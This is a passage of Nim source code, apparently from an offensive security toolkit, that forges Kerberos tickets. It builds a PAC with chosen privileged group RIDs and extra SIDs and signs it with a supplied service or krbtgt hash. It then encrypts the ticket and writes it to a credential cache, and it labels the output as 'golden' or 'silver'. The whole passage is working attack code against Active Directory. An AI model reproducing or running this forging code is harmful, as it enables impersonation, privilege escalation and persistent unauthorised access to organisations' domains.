    code = krb5_c_encrypt_length(ctx, enctype, csize_t(plainCopy.len), addr outLen)
    if code != 0 or outLen == 0:
      err = krb5CryptoError("krb5_c_encrypt_length", code)
      return ""
    result = newString(int(outLen))
    var enc = Krb5EncData(magic: 0, enctype: enctype, kvno: 0,
      ciphertext: Krb5Data(magic: 0, length: cuint(outLen),
        data: cast[cstring](addr result[0])))
    code = krb5_c_encrypt(ctx, addr keyblock, Krb5Int32(usage), nil, addr input, addr enc)
    if code != 0:
      err = krb5CryptoError("krb5_c_encrypt", code)
      result = ""
      return
    result.setLen(int(enc.ciphertext.length))
  finally:
    if ctx != nil: krb5_free_context(ctx)

proc krb5AesChecksum(key: string; enctype: Krb5Enctype; checksumType: int;
                     usage: int; data: string; err: var string): string =
  if key.len == 0:
    err = "empty Kerberos AES key"
    return ""
  var ctx: Krb5Context = nil
  var keyCopy = key
  var dataCopy = data
  var input = Krb5Data(magic: 0, length: cuint(dataCopy.len),
    data: if dataCopy.len > 0: cast[cstring](addr dataCopy[0]) else: nil)
  var keyblock = Krb5Keyblock(magic: 0, enctype: enctype, length: cuint(keyCopy.len),
    contents: if keyCopy.len > 0: cast[pointer](addr keyCopy[0]) else: nil)
  var cksum = Krb5Checksum()
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      err = krb5CryptoError("krb5_init_context", code)
      return ""
    code = krb5_c_make_checksum(ctx, Krb5Int32(checksumType), addr keyblock,
      Krb5Int32(usage), addr input, addr cksum)
    if code != 0:
      err = krb5CryptoError("krb5_c_make_checksum", code)
      return ""
    if cksum.length > 0 and cksum.contents != nil:
      result = newString(int(cksum.length))
      copyMem(addr result[0], cksum.contents, int(cksum.length))
  finally:
    if ctx != nil:
      krb5_free_checksum_contents(ctx, addr cksum)
      krb5_free_context(ctx)

proc u16Le(v: int): string =
  result.add char(v and 0xff)
  result.add char((v shr 8) and 0xff)

proc u64Le(v: int64): string =
  let uv = cast[uint64](v)
  for i in 0..7:
    result.add char((uv shr (i * 8)) and 0xff)

proc winFt(unix: int64): string =
  u64Le((unix + 11644473600'i64) * 10000000'i64)

proc ndrWstr(s: string): string =
  result.add u32Le(s.len)
  result.add u32Le(0)
  result.add u32Le(s.len)
  for ch in s:
    result.add char(ord(ch))
    result.add char(0)
  while result.len mod 4 != 0: result.add char(0)

proc rpcUstrHdr(s: string; refId: int): string =
  let blen = s.len * 2
  result.add u16Le(blen)
  result.add u16Le(blen)
  result.add u32Le(if s.len > 0: refId else: 0)

proc parseSidRaw(sidStr: string): string =
  let parts = sidStr.split('-')
  if parts.len < 4 or parts[0] != "S": return ""
  try:
    let subCount = parts.len - 3
    let rev = parseInt(parts[1])
    let auth = parseBiggestUInt(parts[2])
    result.add char(rev)
    result.add char(subCount)
    for shift in countdown(40, 0, 8):
      result.add char((auth shr shift) and 0xff)
    for part in parts[3 .. ^1]:
      let v = uint32(parseBiggestUInt(part))
      result.add char(v and 0xff)
      result.add char((v shr 8) and 0xff)
      result.add char((v shr 16) and 0xff)
      result.add char((v shr 24) and 0xff)
  except ValueError:
    result = ""

proc parseSidToNdr(sidStr: string): string =
  let raw = parseSidRaw(sidStr)
  if raw.len == 0: return ""
  let subCount = (raw.len - 8) div 4
  result = u32Le(subCount) & raw
  while result.len mod 4 != 0: result.add char(0)

proc parseGroupRids(s: string): seq[uint32] =
  if s.len == 0:
    return @[512'u32, 513'u32, 520'u32]
  for part in s.split(','):
    let t = part.strip()
    if t.len > 0:
      try: result.add uint32(parseInt(t))
      except ValueError: discard

proc buildKerbValidationInfo(username, serverName, domainName, domainSidStr: string;
                              userRid: uint32; groupRids: seq[uint32]; loginTime: int64;
                              extraSids: seq[string] = @[]): string =
  let sidNdr = parseSidToNdr(domainSidStr)
  if sidNdr.len == 0: return ""
  const r0 = 0x00020000
  const r1 = 0x00020004
  const r2 = 0x00020008
  const r3 = 0x0002000C
  const r4 = 0x00020010
  const r5 = 0x00020014
  const r6 = 0x00020018
  var body = ""
  body.add winFt(loginTime)
  body.add u64Le(0x7FFFFFFFFFFFFFFF'i64)
  body.add u64Le(0x7FFFFFFFFFFFFFFF'i64)
  body.add winFt(loginTime - 86400)
  body.add winFt(loginTime - 86400)
  body.add u64Le(0x7FFFFFFFFFFFFFFF'i64)
  body.add rpcUstrHdr(username, r1)
  body.add rpcUstrHdr("", 0)
  body.add rpcUstrHdr("", 0)
  body.add rpcUstrHdr("", 0)
  body.add rpcUstrHdr("", 0)
  body.add rpcUstrHdr("", 0)
  body.add u16Le(100)
  body.add u16Le(0)
  body.add u32Le(int(userRid))
  body.add u32Le(513)
  body.add u32Le(groupRids.len)
  body.add u32Le(r2)
  body.add u32Le(if extraSids.len > 0: 0x20 else: 0)
  for _ in 0 ..< 16: body.add char(0)
  body.add rpcUstrHdr(serverName, r3)
  body.add rpcUstrHdr(domainName, r4)
  body.add u32Le(r5)
  body.add u32Le(0)
  body.add u32Le(0)
  body.add u32Le(0x00000210)
  body.add u32Le(0)
  for _ in 0 ..< 8: body.add char(0)
  for _ in 0 ..< 8: body.add char(0)
  body.add u32Le(0)
  body.add u32Le(0)
  body.add u32Le(extraSids.len)
  body.add u32Le(if extraSids.len > 0: r6 else: 0)
  body.add u32Le(0)
  body.add u32Le(0)
  body.add u32Le(0)
  var refs = ""
  refs.add ndrWstr(username)
  refs.add u32Le(groupRids.len)
  for rid in groupRids:
    refs.add u32Le(int(rid))
    refs.add u32Le(7)
  refs.add ndrWstr(serverName)
  refs.add ndrWstr(domainName)
  refs.add sidNdr
  if extraSids.len > 0:
    refs.add u32Le(extraSids.len)
    for i in 0 ..< extraSids.len:
      refs.add u32Le(0x0002001C + i * 4)
      refs.add u32Le(7)
    for sid in extraSids:
      refs.add parseSidToNdr(sid)
  let objectBufferLen = 4 + body.len + refs.len
  result = "\x01\x10\x08\x00\xcc\xcc\xcc\xcc"
  result.add u32Le(objectBufferLen)
  result.add "\xcc\xcc\xcc\xcc"
  result.add u32Le(r0)
  result.add body
  result.add refs

proc buildPac(logonInfo: string; username: string; loginTime: int64; serviceKey: string;
              err: var string; kdcKey = ""; enctype: int = 23; userSidRaw = ""): string =
  var clientInfo = winFt(loginTime)
  var nameBytes = ""
  for ch in username:
    nameBytes.add char(ord(ch))
    nameBytes.add char(0)
  clientInfo.add u16Le(nameBytes.len)
  clientInfo.add nameBytes
  let sigType = if enctype == 18: 16 else: -138
  let sigLen = if enctype == 18: 12 else: 16
  var serverSig = u32Le(sigType)
  for _ in 0 ..< sigLen: serverSig.add char(0)
  var kdcSig = u32Le(sigType)
  for _ in 0 ..< sigLen: kdcSig.add char(0)
  proc padTo8(s: string): string =
    result = s
    while result.len mod 8 != 0: result.add char(0)
  proc u64LeB(v: uint64): string =
    for i in 0..7: result.add char((v shr (i * 8)) and 0xff)
  proc bufDesc(ulType, cbSize: int; offset: uint64): string =
    result = u32Le(ulType) & u32Le(cbSize) & u64LeB(offset)
  var items: seq[tuple[typ: int; data: string]] = @[]
  items.add (typ: 1, data: logonInfo)
  items.add (typ: 10, data: clientInfo)
  items.add (typ: 17, data: u32Le(2) & u32Le(1))
  if userSidRaw.len > 0:
    items.add (typ: 18, data: userSidRaw)
  items.add (typ: 6, data: serverSig)
  items.add (typ: 7, data: kdcSig)
  let hdrSize = 8 + items.len * 16
  var offsets: seq[uint64] = @[]
  var offset = uint64(hdrSize)
  for item in items:
    offsets.add offset
    offset += uint64(padTo8(item.data).len)
  var pac = u32Le(items.len) & u32Le(0)
  var serverOff = 0'u64
  var kdcOff = 0'u64
  for idx, item in items:
    pac.add bufDesc(item.typ, item.data.len, offsets[idx])
    if item.typ == 6: serverOff = offsets[idx]
    elif item.typ == 7: kdcOff = offsets[idx]
  for item in items:
    pac.add padTo8(item.data)
  let serverChecksum =
    if enctype == 18: krb5AesChecksum(serviceKey, 18, sigType, 17, pac, err)
    else: rc4HmacChecksum(serviceKey, 17, pac)
  if serverChecksum.len == 0:
    return ""
  let effectiveKdcKey = if kdcKey.len > 0: kdcKey else: serviceKey
  let kdcChecksum =
    if enctype == 18: krb5AesChecksum(effectiveKdcKey, 18, sigType, 17, serverChecksum, err)
    else: rc4HmacChecksum(effectiveKdcKey, 17, serverChecksum)
  if kdcChecksum.len == 0:
    return ""
  for i in 0 ..< sigLen:
    pac[int(serverOff) + 4 + i] = serverChecksum[i]
    pac[int(kdcOff) + 4 + i] = kdcChecksum[i]
  result = pac

proc wrapPacAuthData(pacBytes: string): string =
  let inner = seqT(seqT(ctx(0, derInt(128)) & ctx(1, octet(pacBytes))))
  seqT(seqT(ctx(0, derInt(1)) & ctx(1, octet(inner))))

proc buildEncTicketPart(clientUser, realm: string; sessionKey: string; keyEnctype: int;
                        startTs, endTs, renewTs: int64; pacBytes = ""): string =
  let flags = bitString([byte 0x50, 0xa0, 0x00, 0x00])
  let key = seqT(ctx(0, derInt(keyEnctype)) & ctx(1, octet(sessionKey)))
  let transited = seqT(ctx(0, derInt(0)) & ctx(1, octet("")))
  var body = ctx(0, flags) &
    ctx(1, key) &
    ctx(2, genStr(realm.toUpperAscii())) &
    ctx(3, principal(1, @[clientUser])) &
    ctx(4, transited) &
    ctx(5, kerberosTimeFromUnix(startTs)) &
    ctx(6, kerberosTimeFromUnix(startTs)) &
    ctx(7, kerberosTimeFromUnix(endTs)) &
    ctx(8, kerberosTimeFromUnix(renewTs))
  if pacBytes.len > 0:
    body.add ctx(10, wrapPacAuthData(pacBytes))
  app(3, seqT(body))

proc spnParts(spn: string): seq[string] =
  let clean = if spn.contains("@"): spn.split("@")[0] else: spn
  for part in clean.split('/'):
    if part.len > 0:
      result.add part

proc buildTicket(realm, spn, serviceKey: string; encTicketPart: string; enctype: int;
                 err: var string): string =
  let cipher =
    if enctype == 18: krb5AesEncrypt(serviceKey, 18, 2, encTicketPart, err)
    else: rc4HmacEncrypt(serviceKey, 2, encTicketPart)
  if cipher.len == 0:
    return ""
  let encData = seqT(ctx(0, derInt(enctype)) & ctx(2, octet(cipher)))
  app(1, seqT(ctx(0, derInt(5)) &
    ctx(1, genStr(realm.toUpperAscii())) &
    ctx(2, principal(2, spnParts(spn))) &
    ctx(3, encData)))

proc forgeRc4Ccache*(realm, clientUser, spn, serviceKeyHex, outCcache: string;
                     durationHours = 10; domainSid = ""; userRid = 500'u32;
                     groupsStr = ""; kdcKeyHex = ""; startOffsetMinutes = 0;
                     extraSids: seq[string] = @[]): ForgeTicketResult =
  result = ForgeTicketResult(operation: if spn.toLowerAscii().startsWith("krbtgt/"): "golden" else: "silver",
    principal: principalName(clientUser, realm), service: spn, ccache: outCcache)
  let serviceKey = hexToRaw(serviceKeyHex)
  let enctype = if serviceKey.len == 32: 18 else: 23
  if serviceKey.len != 16 and serviceKey.len != 32:
    result.message = "forge requires an RC4/NT hash key or AES256 key"
    return
  let now = getTime().toUnix() + int64(startOffsetMinutes * 60)
  let endTs = now + int64(durationHours * 3600)
  let renewTs = now + int64(max(durationHours, 24) * 3600)
  let sessionKey = randomBytes(if enctype == 18: 32 else: 16)
  let upperRealm = realm.toUpperAscii()
  var pacBytes = ""
  if domainSid.len > 0:
    let dcName = if spn.contains("/"): spn.split("/")[1].split(".")[0].toUpperAscii() else: upperRealm
    let groupRids = parseGroupRids(groupsStr)
    let logonInfo = buildKerbValidationInfo(clientUser, dcName, upperRealm, domainSid,
      userRid, groupRids, now, extraSids)
    if logonInfo.len > 0:
      let kdcKey = if kdcKeyHex.len > 0: hexToRaw(kdcKeyHex) else: ""
      let userSidRaw = parseSidRaw(domainSid & "-" & $userRid)
      var pacErr = ""
      pacBytes = buildPac(logonInfo, clientUser, now, serviceKey, pacErr, kdcKey, enctype, userSidRaw)
      if pacBytes.len == 0 and pacErr.len > 0:
        result.message = pacErr
        return
  let encTicket = buildEncTicketPart(clientUser, upperRealm, sessionKey, enctype, now, endTs, renewTs, pacBytes)
  var encErr = ""
  let ticket = buildTicket(upperRealm, spn, serviceKey, encTicket, enctype, encErr)
  if ticket.len == 0:
    result.message = encErr
    return
  let cacheName = if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"):
      outCcache
    else:
      "FILE:" & outCcache

  var ctx: Krb5Context = nil
  var client: Krb5Principal = nil
  var server: Krb5Principal = nil
  var cache: Krb5Ccache = nil
  var creds = Krb5Creds()
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    code = krb5_parse_name(ctx, principalName(clientUser, upperRealm).cstring, addr client)
    if code != 0:
      result.message = "client principal: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, serviceName(spn, upperRealm).cstring, addr server)
    if code != 0:
      result.message = "service principal: " & krb5Error(ctx, code)
      return
    code = krb5_cc_resolve(ctx, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, cache, client)
    if code != 0:
      result.message = "ccache initialize: " & krb5Error(ctx, code)
      return
    creds.client = client
    creds.server = server
    creds.keyblock.enctype = Krb5Enctype(enctype)
    creds.keyblock.length = sessionKey.len.cuint
    creds.keyblock.contents = cast[pointer](unsafeAddr sessionKey[0])
    creds.times.authtime = Krb5Timestamp(now)
    creds.times.starttime = Krb5Timestamp(now)
    creds.times.endtime = Krb5Timestamp(endTs)
    creds.times.renewTill = Krb5Timestamp(renewTs)
    creds.ticketFlags = 0x50a00000'i32
    creds.ticket.length = ticket.len.cuint
    creds.ticket.data = cast[cstring](unsafeAddr ticket[0])
    code = krb5_cc_store_cred(ctx, cache, addr creds)
    if code != 0:
      result.message = "ccache store forged ticket: " & krb5Error(ctx, code)
      return
    result.success = true
    let etypeName = if enctype == 18: "AES256" else: "RC4"
    result.message = if pacBytes.len > 0: "forged " & etypeName & " ticket with PAC stored" else: "forged " & etypeName & " ticket stored (no PAC)"
  finally:
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if client != nil: krb5_free_principal(ctx, client)
    if server != nil: krb5_free_principal(ctx, server)
    if ctx != nil: krb5_free_context(ctx)
